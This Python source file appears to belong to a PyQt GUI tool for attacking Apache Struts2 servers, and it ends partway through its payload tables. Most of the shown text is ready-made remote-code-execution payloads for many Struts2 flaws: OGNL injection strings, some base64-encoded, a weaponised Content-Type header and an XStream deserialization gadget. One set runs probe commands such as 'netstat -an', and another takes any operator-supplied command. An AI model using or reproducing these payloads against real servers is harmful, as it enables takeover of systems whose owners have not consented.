from colorama import Fore
import urllib.request, urllib.parse
import base64
import requests
from PyQt5.Qt import pyqtSignal,QThread
import re


class Struts2(QThread):
    signal = pyqtSignal([str,str])
    def __init__(self,url,cookie,activity,selection_bug,cmd):
        super().__init__()
        self.url = url
        self.cookie = cookie
        self.activity = activity
        self.selection_bug = selection_bug
        self.cmd = cmd


    headers = {
        "Accept": "application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*",
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    headers2 = {
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
        "Accept": "application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*",
        "Content-Type": "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='netstat -an').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
    }
    headers_052 = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
        "Content-Type": "application/xml"
    }

    poc = {
        "ST2-005": base64.b64decode(
            "KCdcNDNfbWVtYmVyQWNjZXNzLmFsbG93U3RhdGljTWV0aG9kQWNjZXNzJykoYSk9dHJ1ZSYoYikoKCdcNDNjb250ZXh0W1wneHdvcmsuTWV0aG9kQWNjZXNzb3IuZGVueU1ldGhvZEV4ZWN1dGlvblwnXVw3NWZhbHNlJykoYikpJignXDQzYycpKCgnXDQzX21lbWJlckFjY2Vzcy5leGNsdWRlUHJvcGVydGllc1w3NUBqYXZhLnV0aWwuQ29sbGVjdGlvbnNARU1QVFlfU0VUJykoYykpJihnKSgoJ1w0M215Y21kXDc1XCduZXRzdGF0IC1hblwnJykoZCkpJihoKSgoJ1w0M215cmV0XDc1QGphdmEubGFuZy5SdW50aW1lQGdldFJ1bnRpbWUoKS5leGVjKFw0M215Y21kKScpKGQpKSYoaSkoKCdcNDNteWRhdFw3NW5ld1w0MGphdmEuaW8uRGF0YUlucHV0U3RyZWFtKFw0M215cmV0LmdldElucHV0U3RyZWFtKCkpJykoZCkpJihqKSgoJ1w0M215cmVzXDc1bmV3XDQwYnl0ZVs1MTAyMF0nKShkKSkmKGspKCgnXDQzbXlkYXQucmVhZEZ1bGx5KFw0M215cmVzKScpKGQpKSYobCkoKCdcNDNteXN0clw3NW5ld1w0MGphdmEubGFuZy5TdHJpbmcoXDQzbXlyZXMpJykoZCkpJihtKSgoJ1w0M215b3V0XDc1QG9yZy5hcGFjaGUuc3RydXRzMi5TZXJ2bGV0QWN0aW9uQ29udGV4dEBnZXRSZXNwb25zZSgpJykoZCkpJihuKSgoJ1w0M215b3V0LmdldFdyaXRlcigpLnByaW50bG4oXDQzbXlzdHIpJykoZCkp"),
        "ST2-008-1": '''?debug=command&expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27netstat -an%27%29.getInputStream%28%29%29)''',
        "ST2-008-2": '''?debug=command&expression=(%23_memberAccess.allowStaticMethodAccess=true,%23context["xwork.MethodAccessor.denyMethodExecution"]=false,%23cmd="netstat -an",%23ret=@java.lang.Runtime@getRuntime().exec(%23cmd),%23data=new+java.io.DataInputStream(%23ret.getInputStream()),%23res=new+byte[1000],%23data.readFully(%23res),%23echo=new+java.lang.String(%23res),%23out=@org.apache.struts2.ServletActionContext@getResponse(),%23out.getWriter().println(%23echo))''',
        "ST2-009": '''class.classLoader.jarPath=%28%23context["xwork.MethodAccessor.denyMethodExecution"]%3d+new+java.lang.Boolean%28false%29%2c+%23_memberAccess["allowStaticMethodAccess"]%3dtrue%2c+%23a%3d%40java.lang.Runtime%40getRuntime%28%29.exec%28%27netstat -an%27%29.getInputStream%28%29%2c%23b%3dnew+java.io.InputStreamReader%28%23a%29%2c%23c%3dnew+java.io.BufferedReader%28%23b%29%2c%23d%3dnew+char[50000]%2c%23c.read%28%23d%29%2c%23sbtest%3d%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2c%23sbtest.println%28%23d%29%2c%23sbtest.close%28%29%29%28meh%29&z[%28class.classLoader.jarPath%29%28%27meh%27%29]''',
        "ST2-013": base64.b64decode(
            "YT0xJHsoJTIzX21lbWJlckFjY2Vzc1siYWxsb3dTdGF0aWNNZXRob2RBY2Nlc3MiXT10cnVlLCUyM2E9QGphdmEubGFuZy5SdW50aW1lQGdldFJ1bnRpbWUoKS5leGVjKCduZXRzdGF0IC1hbicpLmdldElucHV0U3RyZWFtKCksJTIzYj1uZXcramF2YS5pby5JbnB1dFN0cmVhbVJlYWRlciglMjNhKSwlMjNjPW5ldytqYXZhLmlvLkJ1ZmZlcmVkUmVhZGVyKCUyM2IpLCUyM2Q9bmV3K2NoYXJbNTAwMDBdLCUyM2MucmVhZCglMjNkKSwlMjNzYnRlc3Q9QG9yZy5hcGFjaGUuc3RydXRzMi5TZXJ2bGV0QWN0aW9uQ29udGV4dEBnZXRSZXNwb25zZSgpLmdldFdyaXRlcigpLCUyM3NidGVzdC5wcmludGxuKCUyM2QpLCUyM3NidGVzdC5jbG9zZSgpKX0="),
        "ST2-015":'$%7B123*123%7D.action',
        "ST2-016": base64.b64decode(
            "cmVkaXJlY3Q6JHslMjNyZXElM2QlMjNjb250ZXh0LmdldCglMjdjbyUyNyUyYiUyN20ub3BlbiUyNyUyYiUyN3N5bXBob255Lnh3byUyNyUyYiUyN3JrMi5kaXNwJTI3JTJiJTI3YXRjaGVyLkh0dHBTZXIlMjclMmIlMjd2bGV0UmVxJTI3JTJiJTI3dWVzdCUyNyksJTIzcyUzZG5ldyUyMGphdmEudXRpbC5TY2FubmVyKChuZXclMjBqYXZhLmxhbmcuUHJvY2Vzc0J1aWxkZXIoJTI3bmV0c3RhdCUyMC1hbiUyNy50b1N0cmluZygpLnNwbGl0KCUyN1xccyUyNykpKS5zdGFydCgpLmdldElucHV0U3RyZWFtKCkpLnVzZURlbGltaXRlciglMjdcXEElMjcpLCUyM3N0ciUzZCUyM3MuaGFzTmV4dCgpPyUyM3MubmV4dCgpOiUyNyUyNywlMjNyZXNwJTNkJTIzY29udGV4dC5nZXQoJTI3Y28lMjclMmIlMjdtLm9wZW4lMjclMmIlMjdzeW1waG9ueS54d28lMjclMmIlMjdyazIuZGlzcCUyNyUyYiUyN2F0Y2hlci5IdHRwU2VyJTI3JTJiJTI3dmxldFJlcyUyNyUyYiUyN3BvbnNlJTI3KSwlMjNyZXNwLnNldENoYXJhY3RlckVuY29kaW5nKCUyN1VURi04JTI3KSwlMjNyZXNwLmdldFdyaXRlcigpLnByaW50bG4oJTIzc3RyKSwlMjNyZXNwLmdldFdyaXRlcigpLmZsdXNoKCksJTIzcmVzcC5nZXRXcml0ZXIoKS5jbG9zZSgpfQ=="),
        "ST2-019": base64.b64decode(
            "ZGVidWc9Y29tbWFuZCZleHByZXNzaW9uPSNmPSNfbWVtYmVyQWNjZXNzLmdldENsYXNzKCkuZ2V0RGVjbGFyZWRGaWVsZCgnYWxsb3dTdGF0aWNNZXRob2RBY2Nlc3MnKSwjZi5zZXRBY2Nlc3NpYmxlKHRydWUpLCNmLnNldCgjX21lbWJlckFjY2Vzcyx0cnVlKSwjcmVxPUBvcmcuYXBhY2hlLnN0cnV0czIuU2VydmxldEFjdGlvbkNvbnRleHRAZ2V0UmVxdWVzdCgpLCNyZXNwPUBvcmcuYXBhY2hlLnN0cnV0czIuU2VydmxldEFjdGlvbkNvbnRleHRAZ2V0UmVzcG9uc2UoKS5nZXRXcml0ZXIoKSwjYT0obmV3IGphdmEubGFuZy5Qcm9jZXNzQnVpbGRlcihuZXcgamF2YS5sYW5nLlN0cmluZ1tdeyduZXRzdGF0JywnLWFuJ30pKS5zdGFydCgpLCNiPSNhLmdldElucHV0U3RyZWFtKCksI2M9bmV3IGphdmEuaW8uSW5wdXRTdHJlYW1SZWFkZXIoI2IpLCNkPW5ldyBqYXZhLmlvLkJ1ZmZlcmVkUmVhZGVyKCNjKSwjZT1uZXcgY2hhclsxMDAwMF0sI2QucmVhZCgjZSksI3Jlc3AucHJpbnRsbigjZSksI3Jlc3AuY2xvc2UoKQ=="),
        "ST2-devmode": '''?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()))):sb.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=netstat%20-an''',
        "ST2-032": '''?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=netstat -an&pp=____A&ppp=%20&encoding=UTF-8''',
        "ST2-033": '''/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=2908&command=netstat -an''',
        "ST2-037": '''/(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=16456&command=netstat -an''',
        "ST2-048": '''name=%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='netstat -an').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}''',
        "ST2-052": '''<map> <entry> <jdk.nashorn.internal.objects.NativeString> <flags>0</flags> <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"> <dataHandler> <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"> <is class="javax.crypto.CipherInputStream"> <cipher class="javax.crypto.NullCipher"> <initialized>false</initialized> <opmode>0</opmode> <serviceIterator class="javax.imageio.spi.FilterIterator"> <iter class="javax.imageio.spi.FilterIterator"> <iter class="java.util.Collections$EmptyIterator"/> <next class="java.lang.ProcessBuilder"> <command> <string>whoami</string></command> <redirectErrorStream>false</redirectErrorStream> </next> </iter> <filter class="javax.imageio.ImageIO$ContainsFilter"> <method> <class>java.lang.ProcessBuilder</class> <name>start</name> <parameter-types/> </method> <name>foo</name> </filter> <next class="string">foo</next> </serviceIterator> <lock/> </cipher> <input class="java.lang.ProcessBuilder$NullInputStream"/> <ibuffer></ibuffer> <done>false</done> <ostart>0</ostart> <ofinish>0</ofinish> <closed>false</closed> </is> <consumed>false</consumed> </dataSource> <transferFlavors/> </dataHandler> <dataLen>0</dataLen> </value> </jdk.nashorn.internal.objects.NativeString> <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/> </entry> <entry> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> </entry> </map> ''',
        "ST2-053": '''%25%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27netstat%20-an%27%29.%28%23iswin%3D%28@java.lang.System@getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27%2fc%27%2C%23cmd%7D%3A%7B%27%2fbin%2fbash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28@org.apache.commons.io.IOUtils@toString%28%23process.getInputStream%28%29%29%29%7D''',
        "struts2-057-1": '''/%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27netstat -an%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D''',
        "struts2-057-2": '''/%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27netstat -an%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D''',
    }

    shell = {
        "struts2-045": "",
        "struts2-005": base64.b64decode(
            "KCdcNDNfbWVtYmVyQWNjZXNzLmFsbG93U3RhdGljTWV0aG9kQWNjZXNzJykoYSk9dHJ1ZSYoYikoKCdcNDNjb250ZXh0W1wneHdvcmsuTWV0aG9kQWNjZXNzb3IuZGVueU1ldGhvZEV4ZWN1dGlvblwnXVw3NWZhbHNlJykoYikpJignXDQzYycpKCgnXDQzX21lbWJlckFjY2Vzcy5leGNsdWRlUHJvcGVydGllc1w3NUBqYXZhLnV0aWwuQ29sbGVjdGlvbnNARU1QVFlfU0VUJykoYykpJihnKSgoJ1w0M215Y21kXDc1XCdGVVpaSU5HQ09NTUFORFwnJykoZCkpJihoKSgoJ1w0M215cmV0XDc1QGphdmEubGFuZy5SdW50aW1lQGdldFJ1bnRpbWUoKS5leGVjKFw0M215Y21kKScpKGQpKSYoaSkoKCdcNDNteWRhdFw3NW5ld1w0MGphdmEuaW8uRGF0YUlucHV0U3RyZWFtKFw0M215cmV0LmdldElucHV0U3RyZWFtKCkpJykoZCkpJihqKSgoJ1w0M215cmVzXDc1bmV3XDQwYnl0ZVs1MTAyMF0nKShkKSkmKGspKCgnXDQzbXlkYXQucmVhZEZ1bGx5KFw0M215cmVzKScpKGQpKSYobCkoKCdcNDNteXN0clw3NW5ld1w0MGphdmEubGFuZy5TdHJpbmcoXDQzbXlyZXMpJykoZCkpJihtKSgoJ1w0M215b3V0XDc1QG9yZy5hcGFjaGUuc3RydXRzMi5TZXJ2bGV0QWN0aW9uQ29udGV4dEBnZXRSZXNwb25zZSgpJykoZCkpJihuKSgoJ1w0M215b3V0LmdldFdyaXRlcigpLnByaW50bG4oXDQzbXlzdHIpJykoZCkp").decode(),
        "struts2-008-1": '''?debug=command&expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27FUZZINGCOMMAND%27%29.getInputStream%28%29%29)''',
        "struts2-008-2": '''?debug=command&expression=(%23_memberAccess.allowStaticMethodAccess=true,%23context["xwork.MethodAccessor.denyMethodExecution"]=false,%23cmd="FUZZINGCOMMAND",%23ret=@java.lang.Runtime@getRuntime().exec(%23cmd),%23data=new+java.io.DataInputStream(%23ret.getInputStream()),%23res=new+byte[1000],%23data.readFully(%23res),%23echo=new+java.lang.String(%23res),%23out=@org.apache.struts2.ServletActionContext@getResponse(),%23out.getWriter().println(%23echo))''',
        "struts2-009": '''class.classLoader.jarPath=%28%23context["xwork.MethodAccessor.denyMethodExecution"]%3d+new+java.lang.Boolean%28false%29%2c+%23_memberAccess["allowStaticMethodAccess"]%3dtrue%2c+%23a%3d%40java.lang.Runtime%40getRuntime%28%29.exec%28%27FUZZINGCOMMAND%27%29.getInputStream%28%29%2c%23b%3dnew+java.io.InputStreamReader%28%23a%29%2c%23c%3dnew+java.io.BufferedReader%28%23b%29%2c%23d%3dnew+char[50000]%2c%23c.read%28%23d%29%2c%23sbtest%3d%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2c%23sbtest.println%28%23d%29%2c%23sbtest.close%28%29%29%28meh%29&z[%28class.classLoader.jarPath%29%28%27meh%27%29]''',
        "struts2-013": base64.b64decode(
            "YT0xJHsoJTIzX21lbWJlckFjY2Vzc1siYWxsb3dTdGF0aWNNZXRob2RBY2Nlc3MiXT10cnVlLCUyM2E9QGphdmEubGFuZy5SdW50aW1lQGdldFJ1bnRpbWUoKS5leGVjKCdGVVpaSU5HQ09NTUFORCcpLmdldElucHV0U3RyZWFtKCksJTIzYj1uZXcramF2YS5pby5JbnB1dFN0cmVhbVJlYWRlciglMjNhKSwlMjNjPW5ldytqYXZhLmlvLkJ1ZmZlcmVkUmVhZGVyKCUyM2IpLCUyM2Q9bmV3K2NoYXJbNTAwMDBdLCUyM2MucmVhZCglMjNkKSwlMjNzYnRlc3Q9QG9yZy5hcGFjaGUuc3RydXRzMi5TZXJ2bGV0QWN0aW9uQ29udGV4dEBnZXRSZXNwb25zZSgpLmdldFdyaXRlcigpLCUyM3NidGVzdC5wcmludGxuKCUyM2QpLCUyM3NidGVzdC5jbG9zZSgpKX0=").decode(),
        "struts2-015":'%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23_memberAccess%2Ctrue%29%2C%23q%3D@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27FUZZINGCOMMAND%27%29.getInputStream%28%29%29%2C%23q%7D.action',
        "struts2-016": base64.b64decode(
            "cmVkaXJlY3Q6JHslMjNyZXElM2QlMjNjb250ZXh0LmdldCglMjdjbyUyNyUyYiUyN20ub3BlbiUyNyUyYiUyN3N5bXBob255Lnh3byUyNyUyYiUyN3JrMi5kaXNwJTI3JTJiJTI3YXRjaGVyLkh0dHBTZXIlMjclMmIlMjd2bGV0UmVxJTI3JTJiJTI3dWVzdCUyNyksJTIzcyUzZG5ldyUyMGphdmEudXRpbC5TY2FubmVyKChuZXclMjBqYXZhLmxhbmcuUHJvY2Vzc0J1aWxkZXIoJTI3RlVaWklOR0NPTU1BTkQlMjcudG9TdHJpbmcoKS5zcGxpdCglMjdcXHMlMjcpKSkuc3RhcnQoKS5nZXRJbnB1dFN0cmVhbSgpKS51c2VEZWxpbWl0ZXIoJTI3XFxBJTI3KSwlMjNzdHIlM2QlMjNzLmhhc05leHQoKT8lMjNzLm5leHQoKTolMjclMjcsJTIzcmVzcCUzZCUyM2NvbnRleHQuZ2V0KCUyN2NvJTI3JTJiJTI3bS5vcGVuJTI3JTJiJTI3c3ltcGhvbnkueHdvJTI3JTJiJTI3cmsyLmRpc3AlMjclMmIlMjdhdGNoZXIuSHR0cFNlciUyNyUyYiUyN3ZsZXRSZXMlMjclMmIlMjdwb25zZSUyNyksJTIzcmVzcC5zZXRDaGFyYWN0ZXJFbmNvZGluZyglMjdVVEYtOCUyNyksJTIzcmVzcC5nZXRXcml0ZXIoKS5wcmludGxuKCUyM3N0ciksJTIzcmVzcC5nZXRXcml0ZXIoKS5mbHVzaCgpLCUyM3Jlc3AuZ2V0V3JpdGVyKCkuY2xvc2UoKX0=").decode(),
        "struts2-019": base64.b64decode(
            "ZGVidWc9Y29tbWFuZCZleHByZXNzaW9uPSNmPSNfbWVtYmVyQWNjZXNzLmdldENsYXNzKCkuZ2V0RGVjbGFyZWRGaWVsZCgnYWxsb3dTdGF0aWNNZXRob2RBY2Nlc3MnKSwjZi5zZXRBY2Nlc3NpYmxlKHRydWUpLCNmLnNldCgjX21lbWJlckFjY2Vzcyx0cnVlKSwjcmVxPUBvcmcuYXBhY2hlLnN0cnV0czIuU2VydmxldEFjdGlvbkNvbnRleHRAZ2V0UmVxdWVzdCgpLCNyZXNwPUBvcmcuYXBhY2hlLnN0cnV0czIuU2VydmxldEFjdGlvbkNvbnRleHRAZ2V0UmVzcG9uc2UoKS5nZXRXcml0ZXIoKSwjYT0obmV3IGphdmEubGFuZy5Qcm9jZXNzQnVpbGRlcihuZXcgamF2YS5sYW5nLlN0cmluZ1tdeydGVVpaSU5HQ09NTUFORCd9KSkuc3RhcnQoKSwjYj0jYS5nZXRJbnB1dFN0cmVhbSgpLCNjPW5ldyBqYXZhLmlvLklucHV0U3RyZWFtUmVhZGVyKCNiKSwjZD1uZXcgamF2YS5pby5CdWZmZXJlZFJlYWRlcigjYyksI2U9bmV3IGNoYXJbMTAwMDBdLCNkLnJlYWQoI2UpLCNyZXNwLnByaW50bG4oI2UpLCNyZXNwLmNsb3NlKCk=").decode(),
        "struts2-devmode": '''?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()))):sb.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=FUZZINGCOMMAND''',
        "struts2-032": '''?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=FUZZINGCOMMAND&pp=____A&ppp=%20&encoding=UTF-8''',
        "struts2-033": '''/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=2908&command=FUZZINGCOMMAND''',
        "struts2-037": '''/(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=16456&command=FUZZINGCOMMAND''',
        "struts2-048": '''name=%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='FUZZINGCOMMAND').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}''',
        "struts2-052": '''<map> <entry> <jdk.nashorn.internal.objects.NativeString> <flags>0</flags> <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"> <dataHandler> <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"> <is class="javax.crypto.CipherInputStream"> <cipher class="javax.crypto.NullCipher"> <initialized>false</initialized> <opmode>0</opmode> <serviceIterator class="javax.imageio.spi.FilterIterator"> <iter class="javax.imageio.spi.FilterIterator"> <iter class="java.util.Collections$EmptyIterator"/> <next class="java.lang.ProcessBuilder"> <command> <string>FUZZINGCOMMAND</string> </command> <redirectErrorStream>false</redirectErrorStream> </next> </iter> <filter class="javax.imageio.ImageIO$ContainsFilter"> <method> <class>java.lang.ProcessBuilder</class> <name>start</name> <parameter-types/> </method> <name>foo</name> </filter> <next class="string">foo</next> </serviceIterator> <lock/> </cipher> <input class="java.lang.ProcessBuilder$NullInputStream"/> <ibuffer></ibuffer> <done>false</done> <ostart>0</ostart> <ofinish>0</ofinish> <closed>false</closed> </is> <consumed>false</consumed> </dataSource> <transferFlavors/> </dataHandler> <dataLen>0</dataLen> </value> </jdk.nashorn.internal.objects.NativeString> <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/> </entry> <entry> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> </entry> </map> ''',
